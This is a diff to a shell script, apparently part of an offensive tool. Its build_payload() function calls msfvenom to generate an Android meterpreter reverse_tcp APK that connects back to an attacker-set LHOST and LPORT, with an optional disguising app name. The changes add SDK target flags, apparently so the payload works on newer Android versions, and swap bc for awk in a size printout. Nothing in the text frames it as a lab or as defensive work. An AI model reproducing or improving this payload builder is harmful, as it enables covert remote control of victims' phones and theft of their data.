@@ -77,7 +77,7 @@ build_payload() {
 
     local cmd="msfvenom $apk_flag -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport"
     [ -n "$appname" ] && cmd+=" AndroidAppName='$appname'"
-    cmd+=" -o /tmp/payload.apk --platform android --arch dalvik 2>&1"
+    cmd+=" AndroidMkSdk=33 AndroidTargetSdk=33 -o /tmp/payload.apk --platform android --arch dalvik 2>&1"
 
     if ! eval "$cmd"; then
         err "msfvenom failed"
@@ -92,7 +92,7 @@ build_payload() {
     fi
 
     cp /tmp/payload.apk "$outpath"
-    ok "Payload: $outpath ($(echo "scale=1; $size/1024" | bc) KB)"
+    ok "Payload: $outpath ($(awk "BEGIN {printf \"%.1f\", $size/1024}") KB)"
     echo "$outpath"
 }
 
